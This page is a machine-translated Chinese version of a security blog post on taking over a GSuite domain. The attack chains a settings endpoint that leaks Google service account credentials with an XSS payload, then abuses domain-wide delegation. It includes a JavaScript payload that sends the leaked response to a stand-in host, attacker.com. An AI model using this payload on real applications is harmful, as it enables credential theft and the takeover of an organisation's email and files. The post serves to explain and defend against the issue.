<html>
<head>
<title>GSuite domain takeover through delegation</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">通过委派接管GSuite域</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/gsuite-domain-takeover-through-delegation-9d6664c91142?source=collection_archive---------0-----------------------#2022-07-27">https://infosecwriteups.com/gsuite-domain-takeover-through-delegation-9d6664c91142?source=collection_archive---------0-----------------------#2022-07-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/10d1a4b76401ebe01fbb359ad21121d4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1176/format:webp/1*fa479ylaasXhxUc0za1CRg.jpeg"/></div></figure><h1 id="5f71" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">TL；速度三角形定位法(dead reckoning)</h1><p id="0b8e" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">对于现代web应用程序来说，OAuth集成并不少见，每个集成都需要实现一组特定的安全策略。通过利用web应用程序的不完整业务逻辑，甚至可以检索通过OAuth流集成的Google服务帐户凭证，并通过在GSuite域中委派特定权限来危害所有GSuite用户。</p><p id="a614" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">**免责声明**</p><p id="c6c9" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">任何使用域范围授权并公开其服务帐户凭据的人都容易受到下述问题的攻击。这意味着博客帖子没有揭示所描述产品中的任何0天漏洞，这是一个共同责任问题。</p><h1 id="2eb3" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">GSuite域接管</h1><p id="9b0b" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">对于我们的例子，让我们假设应用程序有一个特定的企业焦点，通过OAuth流集成了大多数第三方服务。然后，应用程序依靠这些集成来提供附加功能和独特的解决方案。此外，一个核心特性是与GSuite的集成。</p><h1 id="63ff" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">IDOR还是破碎的商业逻辑？</h1><p id="7b6a" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">在审查web应用程序时，特别注意应用程序的行为方式以及它有什么样的业务逻辑是非常重要的。例如，管理员用户可以通过以下API端点更新公司设置:</p><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="a1b8" class="me jv iq ma b gy mf mg l mh mi">PUT /api/settings/0921899e-c347-11ec-9d64-0242ac120002/update HTTP/2<br/>Host: vulnerable.com</span><span id="c9a7" class="me jv iq ma b gy mj mg l mh mi">{"integration.name":"GSuite - takeover"}</span></pre><p id="35c6" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">如果这个API端点响应一个很长的公司字段列表，并且通过检查所有这些字段，您发现类似“google_service_account”的字段，那么它可能是一个google服务帐户凭证:</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mk"><img src="../Images/effe6d8bfb611fff89ad1de44dc548d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R93SvymbH3I6vKo-5pqnPQ.png"/></div></div></figure><p id="4a7a" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">一个API可以被设计成在同一个API路径上支持几种方法。所有的方法都是为特定的原因服务的，并且执行它们自己的业务逻辑。</p><p id="4b6e" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">看看API端点示例的<code class="fe mp mq mr ma b">GET</code>方法，应用程序不返回这些凭证，但是<code class="fe mp mq mr ma b">PUT</code>方法返回。因此，回顾相同API路由(端点)的所有支持方法是有价值的，因为它们可以返回不同的数据集。</p><p id="e42d" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">这种数据泄漏可能与另一种攻击联系在一起，从而可能将数据泄漏给攻击者。这可能是一个IDOR，XSS，错误配置的CORS攻击。让我们来看一个XSS攻击的例子，其中有效负载会更新任何公司设置，然后将应用程序响应重定向到恶意的web服务器。</p><p id="580b" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">但是在进入开发步骤之前，我们需要获得更多关于google服务凭证的信息)</p><h1 id="59ad" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">什么是谷歌服务账户？</h1><p id="ac97" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">在这一点上，Google服务帐户的凭证已经被破坏了，但是可以用它们做什么呢？</p><div class="ms mt gp gr mu mv"><a href="https://cloud.google.com/iam/docs/understanding-service-accounts" rel="noopener  ugc nofollow" target="_blank"><div class="mw ab fo"><div class="mx ab my cl cj mz"><h2 class="bd ir gy z fp na fr fs nb fu fw ip bi translated">了解服务帐户| IAM文档| Google云</h2><div class="nc l"><h3 class="bd b gy z fp na fr fs nb fu fw dk translated">服务帐户是一种特殊类型的Google帐户，用于代表需要认证的非人类用户…</h3></div><div class="nd l"><p class="bd b dl z fp na fr fs nb fu fw dk translated">cloud.google.com</p></div></div><div class="ne l"><div class="nf l ng nh ni ne nj js mv"/></div></div></a></div><p id="61cb" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">根据官方文件:</p><blockquote class="nk nl nm"><p id="281e" class="ks kt nn ku b kv lq kx ky kz lr lb lc no ls lf lg np lt lj lk nq lu ln lo lp ij bi translated"><em class="iq">服务帐户是一种特殊类型的帐户，由应用程序或计算工作负载使用，如计算引擎虚拟机(VM)实例，而不是人。应用程序使用服务账户进行</em> <a class="ae nr" href="https://developers.google.com/identity/protocols/OAuth2ServiceAccount#authorizingrequests" rel="noopener ugc nofollow" target="_blank"> <em class="iq">授权API调用</em> </a> <em class="iq">，授权为服务账户本身，或者通过</em> <a class="ae nr" href="https://developers.google.com/identity/protocols/oauth2/service-account#delegatingauthority" rel="noopener ugc nofollow" target="_blank"> <em class="iq">全域委托</em> </a>授权为Google Workspace或云身份用户</p></blockquote><p id="2e2b" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">从应用程序的角度来看，全域委托是我们的示例应用程序业务逻辑的理想匹配。这将允许代表Google Workspace域中的用户访问用户数据。例如，应用程序将能够访问Google日历、Gmail、Sheets、Gdrive API和其他GSuite服务。授权服务帐户代表域中的用户访问数据有时被称为向服务帐户“委派全域性授权”。</p><p id="0bde" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">有一个详细的指南，如何实现域范围的委托:</p><div class="ms mt gp gr mu mv"><a href="https://developers.google.com/admin-sdk/reports/v1/guides/delegation" rel="noopener  ugc nofollow" target="_blank"><div class="mw ab fo"><div class="mx ab my cl cj mz"><h2 class="bd ir gy z fp na fr fs nb fu fw ip bi translated">执行Google Workspace域范围的授权委托| Google Workspace Admin SDK报告…</h2><div class="nc l"><h3 class="bd b gy z fp na fr fs nb fu fw dk translated">在企业应用程序中，您可能希望以编程方式访问用户的数据，而无需对…进行任何手动授权</h3></div><div class="nd l"><p class="bd b dl z fp na fr fs nb fu fw dk translated">developers.google.com</p></div></div><div class="ne l"><div class="ns l ng nh ni ne nj js mv"/></div></div></a></div><h1 id="57e8" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">完整的攻击链</h1><p id="4db8" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">示例攻击链可能由两部分组成。第一种涉及与易受攻击的应用程序的直接通信。我们需要创建一个代表用户更新公司设置的XSS有效负载，然后读取响应并将服务帐户凭证转发到我们控制下的主机。</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi nt"><img src="../Images/6f534751845a500602516d0515723752.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zIrTwmBx8CmYGZilh6qU8A.png"/></div></div></figure><pre class="lv lw lx ly gt lz ma mb mc aw md bi"><span id="d566" class="me jv iq ma b gy mf mg l mh mi">var url = "&lt;https://vulnerable.com/api/settings/0921899e-c347-11ec-9d64-0242ac120002/update&gt;";<br/>fetch(url, {<br/>  method: 'put',<br/>  body: JSON.stringify({"integration.name":"GSuite - takeover"}),<br/>  mode: 'cors',<br/>  headers: new Headers({<br/>    'Content-Type': 'application/json'<br/>  })<br/>})<br/>.then(response =&gt; fetch("&lt;http://attacker.com/leak?response=&gt;"+response))</span></pre><p id="6480" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">对于第二部分，有了Google服务帐户凭证，我们不再与易受攻击的web应用程序进行交互，我们需要定义我们希望访问的范围，获得我们希望授予其权限的电子邮件地址，并代表用户与Google服务进行交互。下图解释了危害GSuite帐户的步骤:</p><figure class="lv lw lx ly gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi nu"><img src="../Images/789a773f3578c3d0ae4ee0d803d8382e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ks1V3B_uRv0uyya_Zr-3YQ.png"/></div></div></figure><h1 id="0b95" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">编写漏洞利用</h1><p id="840c" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">通过读取<code class="fe mp mq mr ma b">service-account-credentials.json</code>文件，我们读取了检索到的Google服务帐户凭证。然后，我们将一组特定的权限委托给我们希望代表其访问GSuite服务的用户，例如Gmail、Gdrive、Calendar、Google Spreadsheet等等。通过遵循下面代码库中的注释，您可以了解如何委派服务帐户的用户权限。</p><figure class="lv lw lx ly gt jr"><div class="bz fp l di"><div class="nv nw l"/></div></figure><h1 id="fe89" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">摘要</h1><p id="7b98" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">通过获得Google服务帐户凭证，攻击者可以在该组织的GSuite域内做任何事情:读取、代表用户发送电子邮件、读取、写入Google Drive中的文件、查看Google表单、幻灯片和文档，换句话说就是所有事情。这就是为什么特殊的安全机制和预防措施对于确保凭据的安全性至关重要。</p><p id="904e" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">此外，这些凭证可能被分配了更多的权限，而不仅仅是我们的示例应用程序所需的域委派权限。如果设置集成的组织不遵循最小特权原则，这些凭据可能有权使用GCP基础架构，这一安全问题将会带来新的攻击媒介。</p><p id="ed12" class="pw-post-body-paragraph ks kt iq ku b kv lq kx ky kz lr lb lc ld ls lf lg lh lt lj lk ll lu ln lo lp ij bi translated">开发人员应该始终检查每个API端点，以确定它返回给最终用户的是什么类型的数据。任何私人用户信息的泄露都会导致灾难性的后果。</p><h1 id="5f59" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">参考</h1><ol class=""><li id="75da" class="nx ny iq ku b kv kw kz la ld nz lh oa ll ob lp oc od oe of bi translated"><a class="ae nr" href="https://cloud.google.com/iam/docs/service-accounts" rel="noopener ugc nofollow" target="_blank">https://cloud.google.com/iam/docs/service-accounts</a></li><li id="c645" class="nx ny iq ku b kv og kz oh ld oi lh oj ll ok lp oc od oe of bi translated"><a class="ae nr" href="https://cloud.google.com/sdk/gcloud/reference/auth/activate-service-account#ACCOUNT" rel="noopener ugc nofollow" target="_blank">https://cloud . Google . com/SDK/g cloud/reference/auth/activate-service-ACCOUNT #账号</a></li><li id="64d5" class="nx ny iq ku b kv og kz oh ld oi lh oj ll ok lp oc od oe of bi translated">【https://cloud.google.com/sdk/gcloud/reference/cheat-sheet T4】</li><li id="7f1d" class="nx ny iq ku b kv og kz oh ld oi lh oj ll ok lp oc od oe of bi translated"><a class="ae nr" href="https://cloud.google.com/iam/docs/understanding-service-accounts" rel="noopener ugc nofollow" target="_blank">https://cloud . Google . com/iam/docs/understanding-service-accounts</a></li><li id="91c4" class="nx ny iq ku b kv og kz oh ld oi lh oj ll ok lp oc od oe of bi translated"><a class="ae nr" href="https://cloud.google.com/compute/docs/reference/rest/beta/regions/list" rel="noopener ugc nofollow" target="_blank">https://cloud . Google . com/compute/docs/reference/rest/beta/regions/list</a></li><li id="20d4" class="nx ny iq ku b kv og kz oh ld oi lh oj ll ok lp oc od oe of bi translated"><a class="ae nr" href="https://stackoverflow.com/questions/33901090/how-to-create-gmail-delegation-with-service-account" rel="noopener ugc nofollow" target="_blank">https://stack overflow . com/questions/33901090/how-to-create-Gmail-delegation-with-service-account</a></li><li id="341b" class="nx ny iq ku b kv og kz oh ld oi lh oj ll ok lp oc od oe of bi translated"><a class="ae nr" href="https://developers.google.com/admin-sdk/directory/v1/guides/delegation#python" rel="noopener ugc nofollow" target="_blank">https://developers . Google . com/admin-SDK/directory/v1/guides/delegation # python</a></li><li id="219d" class="nx ny iq ku b kv og kz oh ld oi lh oj ll ok lp oc od oe of bi translated"><a class="ae nr" href="https://cloud.google.com/iam/docs/understanding-service-accounts#managing_service_account_keys" rel="noopener ugc nofollow" target="_blank">https://cloud . Google . com/iam/docs/understanding-service-accounts # managing _ service _ account _ keys</a></li><li id="bc17" class="nx ny iq ku b kv og kz oh ld oi lh oj ll ok lp oc od oe of bi translated"><a class="ae nr" href="https://stackoverflow.com/questions/53320537/creating-google-api-credentials-from-service-account-with-scope-and-delegated-a" rel="noopener ugc nofollow" target="_blank">https://stack overflow . com/questions/53320537/creating-Google-API-credentials-from-service-account-with-scope-and-delegated-a</a></li><li id="85e1" class="nx ny iq ku b kv og kz oh ld oi lh oj ll ok lp oc od oe of bi translated"><a class="ae nr" href="https://developers.google.com/admin-sdk/reports/v1/guides/delegation" rel="noopener ugc nofollow" target="_blank">https://developers . Google . com/admin-SDK/reports/v1/guides/delegation</a></li></ol></div></div>    
</body>
</html>